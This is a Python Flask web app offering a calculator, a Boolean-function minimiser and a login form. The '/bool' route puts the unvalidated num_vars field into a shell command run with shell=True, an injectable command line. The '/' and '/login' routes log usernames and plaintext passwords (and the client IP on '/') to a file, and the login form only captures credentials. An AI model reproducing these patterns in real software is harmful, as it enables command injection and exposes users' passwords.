from flask import Flask, render_template, redirect, request
import subprocess, logging

app = Flask(__name__)
logging.basicConfig(filename='app.log', level=logging.INFO)

@app.route('/',methods=['GET','POST'])
def home():
    username,password = "", ""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        user_ip = request.remote_addr
        logging.info(f"IP: {user_ip}, Username: {username}, Password: {password}")
        username = username.replace('<','&lt;')
        password = password.replace('<','&lt;')
        return render_template('main.html',user=username)
    return render_template('main.html')

@app.route('/calc')
def calculator():
    return render_template('calc.html')

@app.route('/bool',methods=['GET','POST'])
def boolean():
    error_message = None
    if request.method == 'POST':
        num_vars = request.form['num_vars']
        minterms = request.form['minterms']
        dont_cares = request.form['dont_cares']

        if not all(char.isnumeric() or char.isspace() for char in minterms + dont_cares):
            error_message = 'Invalid input, please try again. (only numbers and spaces allowed)'
            return render_template('bool.html', error_message=error_message)

        try:
            minterms_str = " ".join(minterms.split())
            dont_cares_str = " ".join(dont_cares.split())
        except:
            error_message = 'Invalid input, please try again. (Hint: Use spaces to separate numbers)'
            return render_template('bool.html', error_message=error_message)

        command = f"python3 boolean.py {num_vars} "+'"'+f"{minterms_str}"+'" "'+ f"{dont_cares_str}"+'"'

        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
        output, _ = process.communicate()

        if process.returncode != 0:
            error_message = 'Invalid input, please try again.'
            return render_template('bool.html', error_message=error_message)

        output = output.decode()
        index1 = output.find("Essential")
        index2 = output.find("P0")
        index3 = output.find("Petrick")
        index4 = output.find("Minimum")
        output1 = output[0:index1-4]
        output2 = output[index1:index2-4]
        output3 = output[index2:index3-4]
        output4 = output[index3:index4]
        output5 = output[index4:]
        if (index1 == -1) or (index2 == -1) or (index3 == -1):
            return render_template('bool.html', output0=output)
        else:
            return render_template('bool.html', output1=output1, output2=output2, output3=output3, output4=output4, output5=output5)
    else:
        return render_template('bool.html', error_message=error_message)

@app.route('/login',methods=['GET','POST'])
def login():
    username,password = "", ""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        logging.info(f"Username: {username}, Password: {password}")
        return redirect('/')
    return render_template('login.html')

@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_server_error(e):
    return render_template('500.html'), 500

if __name__ == '__main__':
    ip = "0.0.0.0"
    debug = False
    app.run(host=ip,port=5001,debug=debug)
    